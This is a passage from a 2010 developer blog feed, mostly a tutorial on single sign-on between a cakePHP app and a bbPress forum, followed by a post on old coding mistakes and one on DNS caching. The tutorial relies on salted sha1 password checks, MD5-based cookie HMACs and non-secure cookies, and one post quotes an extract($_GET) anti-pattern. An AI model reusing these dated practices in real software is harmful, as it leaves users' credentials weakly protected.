&lt;span class=&quot;x&quot;&gt;   $userPassFragment = substr($userPass, 8, 4);Â Â Â  // We will take only a small part of the password&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   $expiration = $options[&amp;#39;expiration&amp;#39;];&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   $data = $userLogin.$userPassFragment.&amp;quot;|&amp;quot;.$expiration;Â Â Â  // The main data that will be used create the final hash&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;   // We first get a first hash key that we will use to generate a second one&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   $firstKey = hash_hmac(&amp;#39;md5&amp;#39;, $data, $options[&amp;#39;salt&amp;#39;]);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   // Then we create the final hash saved in the cookie&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   $finalHash = hash_hmac(&amp;#39;md5&amp;#39;, $userLogin.&amp;#39;|&amp;#39;.$expiration, $firstKey);&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;   // The final data to store in the cookie&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   return $userLogin.&amp;quot;|&amp;quot;.$expiration.&amp;quot;|&amp;quot;.$finalHash;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You should pass to this function an array containing a name, password and
expiration date. The password should be exactly as it is stored in the
database.&lt;/p&gt;

&lt;p&gt;You should also pass a 4th value, named salt, that is different depending of
the type of cookie you&amp;#39;re trying to create. For a auth cookie, use
&lt;code&gt;Configure::read(&amp;#39;bbPress.authKey&amp;#39;).Configure::read(&amp;#39;bbPress.authSalt&amp;#39;)&lt;/code&gt; and
for a log cookie, use
&lt;code&gt;Configure::read(&amp;#39;bbPress.logKey&amp;#39;).Configure::read(&amp;#39;bbPress.logSalt&amp;#39;)&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;You will need to create two log cookies (for &lt;code&gt;/&lt;/code&gt; and &lt;code&gt;/forum/&lt;/code&gt;) and three auth
cookies (for &lt;code&gt;/forum/bb-admin&lt;/code&gt;,&lt;code&gt;/forum/bb-plugins&lt;/code&gt; and &lt;code&gt;/forum/my-plugins&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;Here is the complete method for creating all these cookies. Just call it in
your app whenever your want to log the current user to the forum. Just feed it
a user and password.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;/**&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;*Â Â Â  createCookies&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;*Â Â Â  Create the cookies that can be used to connect to the bbPress forum&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;*Â Â Â  bbPress does a lot of complicating stuff with hashing when creating its cookie. We replicate it here&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;*Â Â Â  The content of the cookie is formed in the format username|expirationDate|hash&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;*Â Â Â  The hash part is the most difficult, it involve double hashing based on various salt and values&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;**/&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;function createCookies($name, $pass) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; $expirationDate = time() + 1209600; // When the cookie should stop working (2 weeks)&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt; // Getting the log in salt&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; $completeSalt = Configure::read(&amp;#39;bbPress.logKey&amp;#39;).Configure::read(&amp;#39;bbPress.logSalt&amp;#39;);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; // The log in cookie name&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; $cookieName = &amp;quot;bbpress_logged_in_&amp;quot;.Configure::read(&amp;#39;bbPress.hash&amp;#39;);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; // Getting the value&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; $cookieValue = __getCookieValue(array(&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   &amp;#39;name&amp;#39; =&amp;gt; $name,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   &amp;#39;password&amp;#39; =&amp;gt; $pass,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   &amp;#39;salt&amp;#39; =&amp;gt; $completeSalt,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   &amp;#39;expiration&amp;#39; =&amp;gt; $expirationDate&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; ));&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; // Setting the cookie for the correct path&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; setcookie($cookieName, $cookieValue, $expirationDate, &amp;quot;/&amp;quot;, false, false, true);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; setcookie($cookieName, $cookieValue, $expirationDate, &amp;quot;/forum/&amp;quot;, false, false, true);&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt; // Getting the auth salt&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; $completeSalt = Configure::read(&amp;#39;bbPress.authKey&amp;#39;).Configure::read(&amp;#39;bbPress.authSalt&amp;#39;);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; // The auth cookie name&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; $cookieName = &amp;quot;bbpress_&amp;quot;.Configure::read(&amp;#39;bbPress.hash&amp;#39;);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; // Getting the value&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; $cookieValue = __getCookieValue(array(&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   &amp;#39;name&amp;#39; =&amp;gt; $name,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   &amp;#39;password&amp;#39; =&amp;gt; $pass,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   &amp;#39;salt&amp;#39; =&amp;gt; $completeSalt,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   &amp;#39;expiration&amp;#39; =&amp;gt; $expirationDate&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; ));&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; // Setting the cookie for the correct path&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; setcookie($cookieName, $cookieValue, $expirationDate, &amp;#39;/forum/bb-admin&amp;#39;, false, false, true);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; setcookie($cookieName, $cookieValue, $expirationDate, &amp;#39;/forum/bb-plugins&amp;#39;, false, false, true);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; setcookie($cookieName, $cookieValue, $expirationDate, &amp;#39;/forum/my-plugins&amp;#39;, false, false, true);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And for logging out, just delete the cookies :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;function clearCookies() {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   // The name of the cookie to delete&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   $cookieName = &amp;quot;bbpress_logged_in_&amp;quot;.Configure::read(&amp;#39;bbPress.hash&amp;#39;);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   setcookie($cookieName, &amp;quot;&amp;quot;, time()-3600, &amp;quot;/&amp;quot;, false, false, true);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   setcookie($cookieName, &amp;quot;&amp;quot;, time()-3600, &amp;quot;/forum/&amp;quot;, false, false, true);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   // The auth cookie name&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   $cookieName = &amp;quot;bbpress_&amp;quot;.Configure::read(&amp;#39;bbPress.hash&amp;#39;);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   setcookie($cookieName, &amp;quot;&amp;quot;, time()-3600, &amp;#39;/forum/bb-admin&amp;#39;, false, false, true);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   setcookie($cookieName, &amp;quot;&amp;quot;, time()-3600, &amp;#39;/forum/bb-plugins&amp;#39;, false, false, true);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   setcookie($cookieName, &amp;quot;&amp;quot;, time()-3600, &amp;#39;/forum/my-plugins&amp;#39;, false, false, true);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; }&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hope all that helps ! It took some time to put all this together but I hope it
could help other bakers out there.&lt;/p&gt;

&lt;h2&gt;Downloading&lt;/h2&gt;

&lt;p&gt;For anyone interested, here is a link to download all the files :
http://www.pixelastic.com/download/bbpress.rar&lt;/p&gt;

&lt;p&gt;Note that it can&amp;#39;t be used as-is because it involves a bbPress install, a
custom Authentication system and also because I wrote it as part of a bigger
plugin.&lt;/p&gt;

&lt;p&gt;So, feel free to browse the files and get what you need, but consider it as a
part of a bigger app, so you&amp;#39;ll have to re-plug what&amp;#39;s missing.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Integration of a bbPress forum into a cakePHP application (part 3)</title>
   <link href="http://blog.pixelastic.com/2010/02/17/integration-a-bbpress-forum-into-a-cakephp-application-part-3/"/>
   <updated>2010-02-17T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/02/17/integration-a-bbpress-forum-into-a-cakephp-application-part-3</id>
   <content type="html">&lt;p&gt;Let&amp;#39;s go back to bbPress now. With the previous post, you should be able to
create bbPress user directly from your app.&lt;/p&gt;

&lt;h2&gt;Redirecting bbPress to the cakePHP app actions&lt;/h2&gt;

&lt;p&gt;What we&amp;#39;ll be doing now is adding some hooks on every user-related action on
bbPress to redirect them to their equivalent in your app. No need to have two
different login form, hey ?&lt;/p&gt;

&lt;p&gt;Create a new php file in your &lt;code&gt;app/webroot/forum/my-plugins/&lt;/code&gt; directory, and
copy and paste the following code :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;/*&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;Plugin Name: cakePHP User&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;Description:Â  Remaps each login/register/forgotpass action to those of your own application&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;Version: 0.1&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;Author: Pixelastic&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;Author URI: http://www.pixelastic.com/&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;License: CC-GNU-GPL http://creativecommons.org/licenses/GPL/2.0/&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;*/&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;define( &amp;#39;APP_URL&amp;#39;, &amp;#39;http://www.myapp.com/&amp;#39; );&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;/**&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; *Â Â  Â __convertToAppUrl&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; *Â Â  Â Convert a given bbPress URI to one mapped to the main application&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt; **/&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;function cake_convertToAppUrl($uri) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   // We explode the path in different subdirs&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   $paths = explode(&amp;#39;/&amp;#39;, $uri);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   $nbrPath = count($paths);&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;   // We get the last part of the url&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   $endUri = substr($uri, strrpos($uri, &amp;quot;/&amp;quot;)+1);&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;   $mappedUrl = array(&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;     // Register&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;     &amp;#39;register.php&amp;#39; =&amp;gt; &amp;#39;users/add&amp;#39;,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;     // Lost password&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;     &amp;#39;password-reset.php&amp;#39; =&amp;gt; &amp;#39;users/pass&amp;#39;,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;     // Login&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;     &amp;#39;bb-login.php&amp;#39; =&amp;gt; &amp;#39;users/login&amp;#39;,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;     // Logout&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;     &amp;#39;bb-login.php?action=logout&amp;#39; =&amp;gt; &amp;#39;users/logout&amp;#39;,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;     // Profile editing&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;     &amp;#39;edit&amp;#39; =&amp;gt; &amp;#39;users/edit/&amp;#39;.$paths[$nbrPath-2]&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   );&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;   // If there is a mapping, we return it, otherwise we don&amp;#39;t touch the uri&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   return (!empty($mappedUrl[$endUri])) ? APP_URL.$mappedUrl[$endUri] : $uri;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;// We filter both bb_uri and bb_get_uri&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;add_filter(&amp;#39;bb_uri&amp;#39;, &amp;#39;cake_convertToAppUrl&amp;#39;, 1);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;add_filter(&amp;#39;bb_get_uri&amp;#39;, &amp;#39;cake_convertToAppUrl&amp;#39;, 1);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It will hook every method that ask for a url and convert the result to return
the corresponding url in your own app.&lt;/p&gt;

&lt;p&gt;Don&amp;#39;t forget to enable this plugin in your bbPress admin panel.&lt;/p&gt;

&lt;p&gt;Of course, feel free to change the destination url to reflect those of your
app.&lt;/p&gt;

&lt;h2&gt;Additional information&lt;/h2&gt;

&lt;p&gt;Note that the&lt;code&gt;users/edit/&lt;/code&gt;method takes the bbPress &lt;code&gt;nicename&lt;/code&gt;as argument,
so you should have to convert it before displaying the edit form.&lt;/p&gt;

&lt;p&gt;I also edited my template and added an hidden field in the bbPress login form
to check if the login was coming from the app or the forum and redirect
accordingly.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Integration of a bbPress forum into a cakePHP application (part 2)</title>
   <link href="http://blog.pixelastic.com/2010/02/17/integration-a-bbpress-forum-into-a-cakephp-application-part-2/"/>
   <updated>2010-02-17T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/02/17/integration-a-bbpress-forum-into-a-cakephp-application-part-2</id>
   <content type="html">&lt;p&gt;We&amp;#39;ve done enough work on the forum for now. The time has come to edit our
cake files.&lt;/p&gt;

&lt;h2&gt;Creating the cakePHP models&lt;/h2&gt;

&lt;p&gt;We will create two models to help in speaking with the bbPress database.&lt;/p&gt;

&lt;p&gt;Create a bb_usermeta.php model :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;class BbUsermeta extends AppModel {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  var $useTable = &amp;#39;bb_usermeta&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  var $primaryKey = &amp;#39;umeta_id&amp;#39;;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Create a &lt;code&gt;bb_user.php&lt;/code&gt; model :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;class BbUser extends AppModel {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  var $primaryKey = &amp;#39;ID&amp;#39;;&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;  var $hasMany = array(&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;     &amp;#39;BbUsermeta&amp;#39; =&amp;gt; array(&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;       &amp;#39;className&amp;#39; =&amp;gt; &amp;#39;BbUsermeta&amp;#39;,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;       &amp;#39;foreignKey&amp;#39; =&amp;gt; &amp;#39;user_id&amp;#39;,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;       &amp;#39;dependent&amp;#39; =&amp;gt; true&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    )&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   );&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;  //We make sure, before saving, that the nicename is url-friendly&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  function beforeSave() {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    if (!empty($this-&amp;gt;data[$this-&amp;gt;name][&amp;#39;user_nicename&amp;#39;])) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;      $this-&amp;gt;data[$this-&amp;gt;name][&amp;#39;user_nicename&amp;#39;] = Inflector::slug($this-&amp;gt;data[$this-&amp;gt;name][&amp;#39;user_nicename&amp;#39;]);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    return true;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  }&lt;/span&gt;

&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, what was that about ?&lt;/p&gt;

&lt;p&gt;We created two models to communicate with bbPress. bbPress stores user-related
information in &lt;code&gt;bb_users&lt;/code&gt; as well as &lt;code&gt;bb_usermeta&lt;/code&gt;. We defined the
&lt;code&gt;$primaryKey&lt;/code&gt;, &lt;code&gt;$useTable&lt;/code&gt; and &lt;code&gt;$foreignKey&lt;/code&gt; of the &lt;code&gt;$hasMany&lt;/code&gt; because the
bbPress tables do not follow the cakePHP convention.&lt;/p&gt;

&lt;p&gt;We also add a nifty &lt;code&gt;beforeSave()&lt;/code&gt; method to &lt;code&gt;BbUser&lt;/code&gt;to make sure its
&lt;code&gt;user_nicename&lt;/code&gt; (used as an url slug) is url-friendly.&lt;/p&gt;

&lt;h2&gt;How to save bbPress users from the cakePHP app&lt;/h2&gt;

&lt;p&gt;Great. Now you can easily add, edit and delete users from bbPress directly
from your app.&lt;/p&gt;

&lt;p&gt;There are some things you should know about before doing that :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;first_name&lt;/code&gt; and &lt;code&gt;last_name&lt;/code&gt; are stored in &lt;code&gt;bb_usermeta&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;the access rights are defined in &lt;code&gt;bb_usermeta&lt;/code&gt; too, using the &lt;code&gt;bb_capabilities&lt;/code&gt; key&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Now that you know all that, you can easily create a behavior creating a new
bbPress user when creating a new user, deleting that bbPress user when
deleting the main user and updating the bbPress user when updating the main
user.&lt;/p&gt;

&lt;p&gt;I myself wrote this behavior, but as it is part of a more general bbPress
plugin it may not work as-is. I&amp;#39;ll try to publish it if anyone is interested.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Integration of a bbPress forum into a cakePHP application (part 1)</title>
   <link href="http://blog.pixelastic.com/2010/02/17/integration-a-bbpress-forum-into-a-cakephp-application-part-1/"/>
   <updated>2010-02-17T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/02/17/integration-a-bbpress-forum-into-a-cakephp-application-part-1</id>
   <content type="html">&lt;p&gt;Today I had to integrate a forum into an existing cakePHP app. I didn&amp;#39;t want
to code the whole thing from scratch and wanted to take advantage of one of
the great opensource forums out there instead.&lt;/p&gt;

&lt;p&gt;I wanted to keep the forum as a stand-alone part, with its own admin panel,
and not mess with its core files, to allow me the possibility of updating it
if needed. But I didn&amp;#39;t want my user to register twice, for my app and for the
forum, I wanted the whole register/login thing to be as smooth as possible.&lt;/p&gt;

&lt;p&gt;After some trials, I finally choose bbPress, from the makers of WordPress.&lt;/p&gt;

&lt;p&gt;I took me some time, digging into the online documentation (pretty much non-
existent), digging into existing plugins and the source code to finally script
what I needed. I had to code a cake behavior, a cake component, a bbPress
plugin, overwriting some bbPress functions but it finally works.&lt;/p&gt;

&lt;h2&gt;Installing bbPress on a cakePHP app&lt;/h2&gt;

&lt;p&gt;First thing you need to do is installing bbPress. Just drop the files you
downloaded into &lt;code&gt;app/webroot/forum&lt;/code&gt; and follow the installation instruction.
Set the admin login the same as your own admin login in your app. Type
anything you want for the password, we&amp;#39;ll change that later.&lt;/p&gt;

&lt;p&gt;Once this is done, you should have a working forum, and being able to access
it on &lt;code&gt;/forum&lt;/code&gt;. It&amp;#39;s a good start, isn&amp;#39;t it ?&lt;/p&gt;

&lt;p&gt;Now, open your favorite mysql editor (Navicat or phpmyadmin) and connect to
your database. Make sure the collation of the &lt;code&gt;bb_ tables&lt;/code&gt; are the same as the
collation of your cake tables. It will allow them to correctly communicate. My
cake tables were set to &lt;code&gt;utf8_unicode_ci&lt;/code&gt; and my bbPress tables were set to
&lt;code&gt;utf8_general_ci&lt;/code&gt;. I had to update all the bbPress tables to make sure no
collation problems arise.&lt;/p&gt;

&lt;h2&gt;Using the same password hashing&lt;/h2&gt;

&lt;p&gt;Now let&amp;#39;s look at our bb_users table. You should have one entry for your admin
account. Go to your own cake &lt;code&gt;users&lt;/code&gt;table, copy your password hash and paste
it in place if the bbPress one. Cake and bbPress do not use the same hashing
algorithm, so we are going to change that.&lt;/p&gt;

&lt;p&gt;Open &lt;code&gt;forum/bb-config.php&lt;/code&gt; and add the following code :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;define(&amp;#39;CAKE_SALT&amp;#39;, &amp;quot;XXXXX&amp;quot;);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;// Check password using sha1&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;function bb_check_password( $password, $hash, $user_id = &amp;#39;&amp;#39; ) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  // Does it match ?&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  return sha1(CAKE_SALT.$password)==$hash;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Of course, replace the &lt;code&gt;XXXXX&lt;/code&gt;value of &lt;code&gt;CAKE_SALT&lt;/code&gt; with your own
&lt;code&gt;Security.Salt&lt;/code&gt; value (usually found in &lt;code&gt;app/config/core.php&lt;/code&gt;). Also note that
the default hashing method used by cake is &lt;code&gt;sha1&lt;/code&gt;, but if you use an alternate
&lt;code&gt;md5&lt;/code&gt;or &lt;code&gt;sha256&lt;/code&gt;, you&amp;#39;ll have to update the method above.&lt;/p&gt;

&lt;p&gt;Doing all this, we change the way bbPress checks for a valid password. The
method gets the plain password and the hashed version stored in the database
and compare them. Cake does its comparison using its own internal salt value
and applying &lt;code&gt;sha1()&lt;/code&gt; on it. We just do the same here. That way, we can now
login using the same password.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Reading my own code from 3 years ago</title>
   <link href="http://blog.pixelastic.com/2010/02/15/looking-at-my-own-code-4-years-ago/"/>
   <updated>2010-02-15T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/02/15/looking-at-my-own-code-4-years-ago</id>
   <content type="html">&lt;p&gt;Today I had to update an old site I developped some years ago. I had to move
it from one host to another and make sure all the configuration followed.&lt;/p&gt;

&lt;p&gt;It scares me. What I wrote 3 years ago scares me. My code was... well there
was some huge mistakes, things I would never ever do again. Today, I would
severly frown upon any coder who wrote horribles things like that.&lt;/p&gt;

&lt;p&gt;For the php part, here is a very good list of what NOT to do :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;I used shorthand notation for my php tags : &lt;code&gt;&amp;lt;?&lt;/code&gt; instead of &lt;code&gt;&amp;lt;?php&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;My server was set as &lt;code&gt;register_global&lt;/code&gt; off, but I was circumventing it by doing my own &lt;code&gt;register_global&lt;/code&gt; on :&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;extract($_SERVER);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;extract($_COOKIE);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;extract($_GET);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;extract($_POST);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;My files were encoded in Latin-1, my database was in &lt;code&gt;latin1_swedish_ci&lt;/code&gt; and my html head was set to &lt;code&gt;iso-8859-1&lt;/code&gt;. At least, that was consistent.&lt;/li&gt;
&lt;li&gt;I wasn&amp;#39;t EVER testing if my variables were set, so I had notices popping everywhere. I had the error_reporting set to disable them, hiding the error instead of writing better code.&lt;/li&gt;
&lt;li&gt;The password of my users were stored UNCRYPTED in the database... And stored uncrypted in the cookie as well.&lt;/li&gt;
&lt;li&gt;I was doing something that was supposed to be OOP, but I never used heritage, so all my classes were containing the same methods, copied and pasted from one file to another, and changing only some variable names...&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;And some other mistakes :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;I included a whole bunch of Javascript files (like 15 or so) and was NOT using any js framework. Well, technically I was using a js framework, but one I developped. And let be honest, I can&amp;#39;t really call it a framework today.&lt;/li&gt;
&lt;li&gt;I used &lt;code&gt;letter-spacing:-1000em&lt;/code&gt; to hide text (when using an image as a header for example). It broke on Firefox, I&amp;#39;m now using &lt;code&gt;text-indent:-1000em;&lt;/code&gt; (really, I don&amp;#39;t know if this is better).&lt;/li&gt;
&lt;li&gt;There was a flash animation with sound, enabled by default and with auto-play. For my defense, I remember having told by ex boss that it was a bad idea but he insisted.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;To be honest a part of me is horrified of what I wrote some years ago and
thought was great. On the other hand, I&amp;#39;m quite proud of the progress I have
made in so little time.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>DNS caching and flushing</title>
   <link href="http://blog.pixelastic.com/2010/02/09/dns-caching-flushing/"/>
   <updated>2010-02-09T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/02/09/dns-caching-flushing</id>
   <content type="html">&lt;p&gt;Yesterday I moved this domain from one server to another on my Dreamhost
account (actually, I moved the whole domain from one Dreamhost account to
another, but that&amp;#39;s the same).&lt;/p&gt;

&lt;p&gt;The DNS saved at the registrar where the same (&lt;code&gt;ns1.dreamhost.com&lt;/code&gt;,
&lt;code&gt;ns2.dreamhost.com&lt;/code&gt; and &lt;code&gt;ns3.dreamhost.com&lt;/code&gt;). The transfer went seamlessly and
I was able to access my website on the new server in an invisible way.&lt;/p&gt;

&lt;p&gt;But, strangely, some hours laters I started to experience slow down when
accessing the website and finaly all my requests timed out, be it either from
Firefox or a direct ping.&lt;/p&gt;

&lt;p&gt;I tried with my windows xp and my Ubuntu 8.04. I even change the DNS on xp to
use opendns, run an &lt;code&gt;ipconfig /flushdns&lt;/code&gt;, rebooted. On Ubuntu I&amp;#39;ve done a
&lt;code&gt;/etc/init.d/dns-clean start&lt;/code&gt;. I even rebooted my adsl box, thinking there was
something wrong with the DNS cache on my side.&lt;/p&gt;

&lt;p&gt;I even contacted both Dreamhost and Gandi with a complete traceroute to know
if they could help me, as I thought having done everything that I could think
of to resolve the issue. They assure me that their configuration was fine and
the problem wasn&amp;#39;t on their side.&lt;/p&gt;

&lt;p&gt;When asking friends, or testing with
&lt;a href=&quot;http://downforeveryoneorjustme.com/&quot;&gt;http://downforeveryoneorjustme.com/&lt;/a&gt; it
occured that the problem really was on my side.&lt;/p&gt;

&lt;p&gt;Everyone were true. The problem lied somewhere in between, in the DNS cache
hold by my ISP that wasn&amp;#39;t correctly up to date. I don&amp;#39;t really understand how
that could happen, I thought rebooting my Freebox would clear its cache, and
specifying dns addresses of opendns would bypass the dns resolve of my ISP but
it seems not to be the case.&lt;/p&gt;

